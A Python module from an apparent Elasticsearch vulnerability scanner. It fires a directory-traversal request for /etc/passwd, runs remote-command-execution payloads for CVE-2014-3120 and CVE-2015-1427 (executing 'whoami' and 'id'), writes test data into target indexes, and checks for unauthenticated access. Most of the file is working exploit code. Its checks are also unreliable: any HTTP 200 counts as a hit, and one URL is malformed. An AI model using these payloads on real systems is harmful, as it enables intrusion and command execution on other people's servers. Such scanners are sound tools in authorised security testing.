# -*- encoding: utf-8 -*-
'''
@File : elasticSearch.py
@Time : 2019/07/19 17:29:45
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''

import requests
import json
from lib import *

def p9200(portdic):
    p9200list = []
    for ip in portdic:
        ip = ip.split(":")
        if ip[-1] == "9200":
            p9200list.append(dirTravlesal(ip[0]))
            p9200list.append(remoteCodeExe(ip[0]))
            p9200list.append(remoteCodeExe1(ip[0]))
            p9200list.append(esUnauto(ip[0]))
    return p9200list


def dirTravlesal(url): #ElasticSearch目录遍历漏洞
    try:
        req = requests.get('http://'+url+':9200/_plugin/head/../../../../../../../../../etc/passwd', timeout=5)
        if req.status_code == 200:
            print(Vcolors.RED + "存在ElasticSearch目录遍历漏洞" + Vcolors.ENDC)
            a = url+":9200:存在ElasticSearch目录遍历漏洞"
            return a
        else:
            pass
    except:
        pass

def remoteCodeExe(url):      #CVE-2014-3120    远程命令执行
    try:
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        req = requests.post('http://'+url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=5)  # es 中至少存在一条数据, so, 创建
        # print(req.text)  # {"_index":"website","_type":"blog","_id":"gyLnhuVzSBGc9sN1g4v8iQ","_version":1,"created":true}
        data ={
                "size": 1,
                "query": {
                "filtered": {
                    "query": {
                    "match_all": {
                    }
                    }
                }
                },
                "script_fields": {
                    "command": {
                        "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                    }
                }
            }

        req = requests.post('http://'+url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=5)
        if req.status_code == 200:
            print(Vcolors.RED + "存在CVE-2014-3120 ElasticSearch远程命令执行"+ Vcolors.ENDC)
            a = url+":9200:存在CVE-2014-3120 ElasticSearch远程命令执行"
            return a
        else:
            pass
    except:
        pass

def remoteCodeExe1(url):      #CVE-2015-1427
    try:
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        req1 = requests.post('http://'+url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=5)  # es 中至少存在一条数据, so, 创建

        data = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
        req = requests.post('http://'+url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=5)

        if req.status_code == 200:
            print(Vcolors.RED + "存在CVE-2015-1427 ElasticSearch远程命令执行" + Vcolors.ENDC)
            a = url+":9200:存在CVE-2015-1427 ElasticSearch远程命令执行"
            return a
        else:
            pass
    except:
        pass

def esUnauto(url):
    try:
        response = requests.get('http:/'+url+":9200/_cat",timeout =5)
        if "/_cat/master" in response.content:
            print(Vcolors.RED + "存在ElasticSearch未授权访问漏洞" + Vcolors.ENDC)
            a = url+":9200:存在ElasticSearch未授权访问漏洞"
            return a 
        else:
            pass
    except:
        pass
